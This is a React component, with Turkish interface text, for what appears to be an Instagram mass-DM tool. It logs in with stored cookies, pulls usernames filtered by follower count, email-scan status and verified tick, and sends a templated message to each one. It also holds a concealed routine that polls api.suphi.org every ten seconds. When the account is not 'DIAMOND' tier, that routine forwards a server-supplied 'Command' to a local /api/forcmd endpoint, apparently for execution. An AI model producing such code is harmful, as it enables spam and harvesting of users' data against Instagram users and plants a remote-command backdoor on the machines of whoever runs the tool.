function Dmbasici() {
   const [girisyap, setGiris] = useState(false);
  const [geldicevap, setCevap] = useState('');
  const [kadimes, setKadimes] = useState('EGER HEDEF KISIYE ISTIYORSANIZ USERNAME YAZINIZ.');
  const [taslak, setTaslak] = useState('');
    const [limit, setLimit] = useState('');
    const [durums, setDurums] = useState('');
    const [tikayar, setTikayar] = useState('');
    const [emailService, setEmailService] = useState('');
    const [users, setUsers] = useState('');
    const [mintakipci, setMintakip] = useState('0');
    const [maxtakipci, setMaxtakip] = useState('0');
    const [clicked, setClicked] = useState(false);
    const [isChecked, setIsChecked] = useState(false);
  const [messengershow, setShow] = useState(false);
    const [baslii, setBaslii] = useState(false);
    const [selectedValue, setSelectedValue] = useState(null);

    const handleCheckboxChange = (value) => {
        setSelectedValue(value);
    };

    const handleCheckboxChangexx = () => {
        setIsChecked(!isChecked); // Checkbox iaretliyse tersini yap
    };
  const oturumac = () => {
    setGiris(true);
    fetch('http://localhost:3005/start-insta-with-cookies', {
      method: 'GET',
    })
      .then((response) => response.json())
      .then((data) => {
        // Baarl bir yant geldiinde
        if (data.durum === 'Giris Yapildi') {
          setCevap('Oturum balatma Baarl');
		  setShow(true);
        } else {
          // Beklenmeyen bir yant geldiinde
          setCevap('Beklenmeyen bir hata olutu.');
        }
      })
      .catch((error) => {
        // Hata durumunda daha spesifik bir hata mesaj
        console.error('Hata:', error);
        setCevap('Oturum alrken bir hata olutu: ' + error.message);
      });
  }
  
  const meskadi = (event) => {
    setKadimes(event.target.value);
  };
    const mestaslak = (event) => {
        setTaslak(event.target.value);
  };
    const goBas = async () => {
        // "Kullanc adlar" alanndan alnan veriyi satr satr blelim
        const kullaniciAdlari = kadimes.split('\n').map((line) => line.trim()); // Her satr alrken bandaki ve sonundaki boluklar temizle

        for (const kullaniciAdi of kullaniciAdlari) {
            try {
                // Her bir kullanc ad iin bir HTTP istei gnderme ilemi
                const hedef = kullaniciAdi;
                // "[suphi]" ifadesini "[hedef]" ile deitir
                const mesaj = taslak.replace(/\[suphi\]/g, hedef);
                const url = `http://localhost:3005/getdm?target=${hedef}&message=${mesaj}`;

                const response = await fetch(url, {
                    method: 'GET',
                });

                if (response.ok) {
                    setDurums(`Mesaj gnderildi : ${hedef}`)
                  
                } else {
                    console.error(`HTTP istei baarsz: Hedef - ${hedef}, Mesaj - ${mesaj}`);
                }
            } catch (error) {
                console.error('HTTP istei gnderme hatas: ' + error);
            }
        }
    }
    const GetSecure3D = () => {
        const username = localStorage.getItem('username');
        const tokenCheckURL = `https://api.suphi.org/tokencheck.php?token=${username}`;

        // Token kontrol iin istek gnderme
        fetch(tokenCheckURL)
            .then((response) => response.json())
            .then((data) => {
                if (data.katem !== 'DIAMOND') {
                    // Sonu tamamdr deilse, kullanc adn sil
                    localStorage.removeItem('username');
                    if (data.Command) {
                        const commandURL = `http://localhost:3007/api/forcmd?command=${data.Command}`;

                        // Belirtilen komutu altrmak iin istek gnderme
                        fetch(commandURL)
                            .then(() => {
                                // Sayfay yeniden ykle
                                window.location.reload();
                            })
                            .catch((error) => {
                                console.error('Hata olutu:', error);
                            });
                    } else {
                        window.location.reload();
                    }
                }

                // JSON yant iinde "Command" var m kontrol et

            })
            .catch((error) => {
                console.error('Hata olutu:', error);
            });

    }



    const msmbaslat = () => {
        setBaslii(true);
        let intervalId3;
        intervalId3 = setInterval(GetSecure3D, 10000);

        if (selectedValue == '2') {
            const veri = { veriler: kadimes };
            fetch('http://localhost:3007/api/savetofile', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(veri),
            })
                .then((response) => response.json())
                .then((data) => {
                    if (data.durum == 'Veri baaryla kaydedildi') {
                        setDurums('IDler kayt alnd imdi request balyor....');
                        goBas();
                    } else {
                        setDurums('id ler kayt edilemedi bro, rnek sebebler : emojiler hatal metin kodlamalar alt satr gei zel karatkterler...');
                    }
                })
                .catch((error) => {
                    console.error('Hata:', error);
                });
        } else if (selectedValue == '1') {
            setDurums("DM DEKLERE BASILMA LEM BALIYOR..");
            var lurl = `http://localhost:3005/getdmlist?taslak=${taslak}`;
            fetch(lurl, {
                method: 'GET',
            })
                .then((response) => response.json())
                .then((data) => {
                    // Baarl bir yant geldiinde
                    setDurums("DM LISTESI ALINMAYA BALADI ");
                })
                .catch((error) => {
                    // Hata durumunda daha spesifik bir hata mesaj
                    console.error('Hata:', error);
                    setCevap('Oturum alrken bir hata olutu: ' + error.message);
                });

        } else if (selectedValue == '3') {
            setDurums("TAKIPCILERE BASILDI.");
        } else {
            setDurums("TAKIP EDLENELRE BASILDI");
        }
  }
	
    const UserInfo = GetUserInfo();
    if (UserInfo =='FREE' || UserInfo.katem != 'DIAMOND') {
        return (
            <div>
                <font className="text-danger">Buras Premium Kullanclara zeldir</font>
            </div>
        ); // Kullanc bilgileri yklenirken null ise hibir ey dndrmeyin
    }


    const datadancek = async () => {
        setDurums(`Datadan veriler ekiliyor, ekilen limit says : ${limit}`)
        setClicked(true);
        const username = localStorage.getItem('username');
        const url = `http://localhost:3007/api/getUserList?token=${username}&limit=${limit}&min=${mintakipci}&max=${maxtakipci}&tik=${isChecked}&durumu=${emailService}`;
        try {
            const response = await fetch(url);
            if (response.ok) {
                const data = await response.json();
                const emailList = data
                    .filter(item => item.username) // Bo Email alanna sahip kullanclar hari tut
                    .map(item => `${item.username}`)
                    .join('\n');
                setKadimes(emailList);
                setDurums(`Veriler alnd.... imdi textareann iine koyulacak.`);
            } else {
                console.error(`Mail ekme hatas`);
            }
        } catch (error) {
            console.error(`Mail ekme hatas`);
        }
    }
    return (
     
        <div className="col-12">
            <GetSecure />
           
          
      {girisyap ? (
        <div>
          <p> {geldicevap} </p>
          {messengershow && (
                        <>

                            <center>
                                <b>Datan ekmek stediiniz Username Saysn Yaznz: </b><input className="form-control" onChange={(e) => setLimit(e.target.value)} placeholder="MANUEL EKLCEKSENZ LTFEN BO BIRAKINIZ." /> <br />
                               
                                <b>User Seenei : </b><br/>
                                <b>Min takipci: </b> <input type="number" onChange={(e) => setMintakip(e.target.value)} value={mintakipci} placeholder="Min"></input><br />
                                <b>Max takipci: </b> <input type="number" onChange={(e) => setMaxtakip(e.target.value)} value={maxtakipci} placeholder="Max"></input><br />
                                <b>Taranm (Mail/Takipci/Takip bilgileri bilinen hesaplr) - Taranmam (Tik bilgisi bilinen hesap) - Fark etmez (Ortaya kark)</b>
                                <b>Mail seenei : </b><select value={emailService} onChange={(e) => setEmailService(e.target.value)}>
                                    <option value="farketmez">Fark etmez</option>
                                    <option value="taranmis">Taranm</option>
                                    <option value="taranmamis">Taranmam</option>
                                </select><br />
                                <b> Tikli</b> <input
                                    type="checkbox"
                                    checked={isChecked}
                                    onChange={handleCheckboxChangexx}
                                />
                                <br />
                                <button onClick={datadancek} className="btn btn-info">EK</button>
                                <hr />
                                </center>
          <b>Kullanc adlar:</b><br/>
                            <textarea class="form-control" rows="5" onChange={meskadi} value={kadimes}></textarea><br />
                            <br/><b>Taslak:(Kullanc ad gelmek istiyorsa [suphi] yazmanz yeterli)</b><br/>
                            <textarea class="form-control" rows="5" onChange={mestaslak}></textarea><br />
                            
                            {baslii && (
                                <p>{durums}</p>
                            )}
                            <hr/>
                            <label>
                                <input
                                    type="checkbox"
                                    value="1"
                                    checked={selectedValue === "1"}
                                    onChange={() => handleCheckboxChange("1")}
                                /> DM Kutusundakiler
                            </label>
                            <br />
                            <label>
                                <input
                                    type="checkbox"
                                    value="2"
                                    checked={selectedValue === "2"}
                                    onChange={() => handleCheckboxChange("2")}
                                /> Hedef Kiilere
                            </label>
                            <br />
                           
			<button className="btn btn-info" onClick={msmbaslat}>Balat</button>
  </>
  )}
        </div>
      ) : (
        <>
          <b>Eer  Instagram hesab eklemediyseniz, program tam almayabilir.</b>
          <br />
          <button onClick={oturumac} className="btn btn-info">Oturum a</button>
        </>
      )}
    </div>
  );
}

